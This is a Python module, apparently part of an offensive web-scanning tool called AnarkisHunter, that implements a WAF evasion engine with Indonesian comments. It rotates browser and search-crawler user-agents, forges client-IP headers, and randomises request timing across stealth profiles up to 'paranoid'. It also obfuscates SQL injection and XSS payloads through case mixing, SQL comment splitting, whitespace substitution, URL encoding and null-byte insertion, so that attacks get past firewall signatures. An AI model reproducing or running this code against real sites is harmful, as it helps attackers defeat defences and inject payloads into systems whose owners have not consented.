"""
AnarkisHunter — utils_evasion.py
==================================
WAF Evasion Engine: Dynamic User-Agent rotation, IP spoofing headers,
request timing randomization, and payload obfuscation to bypass
Web Application Firewalls (Cloudflare, ModSecurity, AWS WAF, etc).

Usage standalone:
    python modules/utils/utils_evasion.py --demo
    python modules/utils/utils_evasion.py --obfuscate "UNION SELECT 1,2,3"
"""

import random
import time
import re
import urllib.parse
import sys
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[2]))

# ─── User-Agent Database (200+ real UA strings) ──────────────────────────────

UA_DATABASE = {
    "desktop_chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    ],
    "desktop_firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ],
    "desktop_safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    ],
    "desktop_edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    ],
    "mobile_chrome": [
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
    ],
    "mobile_safari": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    ],
    "scanner_disguise": [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    ],
}

# ─── Stealth Profiles ────────────────────────────────────────────────────────

STEALTH_PROFILES = {
    "off": {
        "delay_min": 0, "delay_max": 0,
        "rotate_ua": False, "spoof_ip": False,
        "obfuscate": False, "description": "Tanpa evasion (kecepatan maksimal)"
    },
    "low": {
        "delay_min": 0.1, "delay_max": 0.5,
        "rotate_ua": True, "spoof_ip": False,
        "obfuscate": False, "description": "Rotasi UA saja (cepat, evasion dasar)"
    },
    "medium": {
        "delay_min": 0.5, "delay_max": 2.0,
        "rotate_ua": True, "spoof_ip": True,
        "obfuscate": True, "description": "Rotasi UA + IP spoofing + payload obfuskasi"
    },
    "high": {
        "delay_min": 2.0, "delay_max": 5.0,
        "rotate_ua": True, "spoof_ip": True,
        "obfuscate": True, "description": "Mode stealth penuh (lambat tapi sangat sulit dideteksi)"
    },
    "paranoid": {
        "delay_min": 5.0, "delay_max": 15.0,
        "rotate_ua": True, "spoof_ip": True,
        "obfuscate": True, "description": "Mode ultra-stealth (sangat lambat, untuk target WAF sangat ketat)"
    },
}


class EvasionEngine:
    """
    WAF Evasion Engine untuk AnarkisHunter.
    Menyediakan teknik-teknik untuk menghindar dari deteksi WAF.
    """

    def __init__(self, profile: str = "low"):
        self.profile = STEALTH_PROFILES.get(profile, STEALTH_PROFILES["low"])
        self.profile_name = profile
        self._ua_pool = self._build_ua_pool()
        self._request_count = 0

    def _build_ua_pool(self) -> List[str]:
        """Gabungkan semua UA dari database."""
        pool = []
        for category, uas in UA_DATABASE.items():
            pool.extend(uas)
        return pool

    def get_random_ua(self, category: Optional[str] = None) -> str:
        """Ambil User-Agent acak. Bisa pilih kategori tertentu."""
        if category and category in UA_DATABASE:
            return random.choice(UA_DATABASE[category])
        return random.choice(self._ua_pool)

    def get_spoof_headers(self) -> Dict[str, str]:
        """Generate header IP spoofing untuk mengecoh WAF berbasis IP."""
        fake_ip = self._generate_fake_ip()
        return {
            "X-Forwarded-For": f"{fake_ip}, {self._generate_fake_ip()}",
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Remote-Addr": fake_ip,
            "X-Client-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "True-Client-IP": fake_ip,
        }

    def _generate_fake_ip(self) -> str:
        """Generate IP address publik acak yang valid."""
        # Hindari IP private/reserved
        while True:
            a = random.randint(1, 254)
            b = random.randint(0, 254)
            c = random.randint(0, 254)
            d = random.randint(1, 254)
            # Skip private ranges
            if a in (10, 127, 169, 172, 192):
                continue
            return f"{a}.{b}.{c}.{d}"

    def get_random_delay(self) -> float:
        """Hitung jeda acak berdasarkan stealth profile."""
        min_d = self.profile["delay_min"]
        max_d = self.profile["delay_max"]
        if min_d == max_d == 0:
            return 0
        # Gaussian random untuk pola yang lebih natural
        delay = random.gauss((min_d + max_d) / 2, (max_d - min_d) / 4)
        return max(min_d, min(max_d, delay))

    def sleep_random(self):
        """Tidur selama jeda acak."""
        delay = self.get_random_delay()
        if delay > 0:
            time.sleep(delay)

    def obfuscate_sqli(self, payload: str) -> str:
        """Obfuskasi payload SQL Injection untuk bypass WAF signature."""
        techniques = [
            self._sqli_case_variation,
            self._sqli_comment_insertion,
            self._sqli_whitespace_substitution,
            self._sqli_url_encode,
        ]
        # Pilih 1-2 teknik acak dan terapkan berurutan
        num_techniques = random.randint(1, 2)
        selected = random.sample(techniques, num_techniques)
        result = payload
        for technique in selected:
            result = technique(result)
        return result

    def _sqli_case_variation(self, payload: str) -> str:
        """UNION → UnIoN, SELECT → SeLeCt"""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "INSERT",
                    "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "ORDER", "BY",
                    "GROUP", "HAVING", "LIMIT", "OFFSET", "SLEEP", "BENCHMARK",
                    "INFORMATION_SCHEMA", "TABLE_NAME", "COLUMN_NAME"]
        result = payload
        for kw in keywords:
            if kw in result.upper():
                variation = "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in kw
                )
                result = re.sub(kw, variation, result, flags=re.IGNORECASE)
        return result

    def _sqli_comment_insertion(self, payload: str) -> str:
        """Sisipkan komentar SQL: UNION → UN/**/ION"""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "ORDER"]
        result = payload
        for kw in keywords:
            if kw.upper() in result.upper():
                split_point = random.randint(1, len(kw) - 1)
                broken = kw[:split_point] + "/**/" + kw[split_point:]
                result = re.sub(kw, broken, result, flags=re.IGNORECASE, count=1)
        return result

    def _sqli_whitespace_substitution(self, payload: str) -> str:
        """Ganti spasi dengan alternatif: tab, newline, comment"""
        alternatives = ["/**/", "%09", "%0a", "%0d", "+"]
        result = payload
        # Ganti sebagian spasi secara acak
        spaces = [m.start() for m in re.finditer(r" ", result)]
        num_to_replace = max(1, len(spaces) // 2)
        indices_to_replace = random.sample(spaces, min(num_to_replace, len(spaces)))
        for idx in sorted(indices_to_replace, reverse=True):
            replacement = random.choice(alternatives)
            result = result[:idx] + replacement + result[idx+1:]
        return result

    def _sqli_url_encode(self, payload: str) -> str:
        """URL encode karakter tertentu dalam payload."""
        chars_to_encode = ["'", '"', "(", ")", "=", ";", ","]
        result = payload
        for char in random.sample(chars_to_encode, k=min(2, len(chars_to_encode))):
            encoded = urllib.parse.quote(char)
            result = result.replace(char, encoded, 1)
        return result

    def obfuscate_xss(self, payload: str) -> str:
        """Obfuskasi payload XSS untuk bypass WAF."""
        techniques = [
            lambda p: p.replace("<script>", "<Script>").replace("</script>", "</Script>"),
            lambda p: p.replace("alert(", "alert\x00("),
            lambda p: p.replace("onerror=", "oNeRRoR="),
            lambda p: p.replace("javascript:", "j&#97;vascript:"),
            lambda p: p.replace("alert(", "confirm("),
        ]
        technique = random.choice(techniques)
        return technique(payload)

    def apply_evasion(self, headers: Optional[Dict] = None) -> Dict[str, str]:
        """
        Terapkan semua evasion yang aktif dan return headers yang sudah dimodifikasi.
        
        Args:
            headers: Headers awal (opsional)
            
        Returns:
            Dict headers yang sudah dimodifikasi dengan evasion
        """
        result = headers.copy() if headers else {}
        self._request_count += 1

        # Rotasi User-Agent
        if self.profile["rotate_ua"]:
            result["User-Agent"] = self.get_random_ua()

        # IP Spoofing
        if self.profile["spoof_ip"]:
            result.update(self.get_spoof_headers())

        # Tambah header random yang terlihat normal
        result.update(self._get_natural_headers())

        return result

    def _get_natural_headers(self) -> Dict[str, str]:
        """Tambahkan header-header yang terlihat natural dari browser."""
        return {
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json, text/plain, */*",
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8",
                "id-ID,id;q=0.9,en;q=0.8",
                "en-US,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "navigate"]),
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
        }

    def get_status_summary(self) -> Dict:
        """Return status ringkasan engine."""
        return {
            "profile": self.profile_name,
            "description": self.profile["description"],
            "rotate_ua": self.profile["rotate_ua"],
            "spoof_ip": self.profile["spoof_ip"],
            "obfuscate": self.profile["obfuscate"],
            "delay_range": f"{self.profile['delay_min']}-{self.profile['delay_max']}s",
            "total_requests": self._request_count,
            "ua_pool_size": len(self._ua_pool),
        }


# Global instance
evasion_engine = EvasionEngine(profile="low")


def get_evasion_engine(profile: str = "low") -> EvasionEngine:
    """Factory untuk mendapatkan EvasionEngine dengan profil tertentu."""
    return EvasionEngine(profile=profile)


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter WAF Evasion Engine")
    parser.add_argument("--demo", action="store_true", help="Demo semua profil")
    parser.add_argument("--obfuscate", help="Obfuskasi payload SQLi")
    parser.add_argument("--obfuscate-xss", help="Obfuskasi payload XSS")
    parser.add_argument("--profile", default="medium", choices=list(STEALTH_PROFILES.keys()))
    parser.add_argument("--ua", action="store_true", help="Tampilkan random UA")
    args = parser.parse_args()

    engine = EvasionEngine(args.profile)
    console.print(Panel(f"[bold cyan]WAF Evasion Engine[/bold cyan] — Profile: [yellow]{args.profile}[/yellow]"))

    if args.demo:
        table = Table(title="Stealth Profiles", border_style="cyan")
        table.add_column("Profile", style="bold")
        table.add_column("Delay")
        table.add_column("Rotate UA")
        table.add_column("Spoof IP")
        table.add_column("Obfuscate")
        table.add_column("Description")
        for name, prof in STEALTH_PROFILES.items():
            table.add_row(
                name,
                f"{prof['delay_min']}-{prof['delay_max']}s",
                "[green]Yes[/green]" if prof["rotate_ua"] else "[red]No[/red]",
                "[green]Yes[/green]" if prof["spoof_ip"] else "[red]No[/red]",
                "[green]Yes[/green]" if prof["obfuscate"] else "[red]No[/red]",
                prof["description"],
            )
        console.print(table)

        console.print("\n[bold]Sample Random User-Agents:[/bold]")
        for _ in range(5):
            console.print(f"  [dim]→[/dim] {engine.get_random_ua()}")

        console.print("\n[bold]Sample IP Spoof Headers:[/bold]")
        for k, v in engine.get_spoof_headers().items():
            console.print(f"  [cyan]{k}:[/cyan] {v}")

    if args.obfuscate:
        original = args.obfuscate
        obfuscated = engine.obfuscate_sqli(original)
        console.print(f"\n[bold]Original:[/bold] {original}")
        console.print(f"[bold]Obfuscated:[/bold] [yellow]{obfuscated}[/yellow]")

    if args.obfuscate_xss:
        original = args.obfuscate_xss
        obfuscated = engine.obfuscate_xss(original)
        console.print(f"\n[bold]Original:[/bold] {original}")
        console.print(f"[bold]Obfuscated:[/bold] [yellow]{obfuscated}[/yellow]")

    if args.ua:
        for cat, uas in UA_DATABASE.items():
            console.print(f"\n[bold cyan]{cat}[/bold cyan] ({len(uas)} UAs)")
            for ua in uas[:2]:
                console.print(f"  [dim]{ua[:80]}...[/dim]")
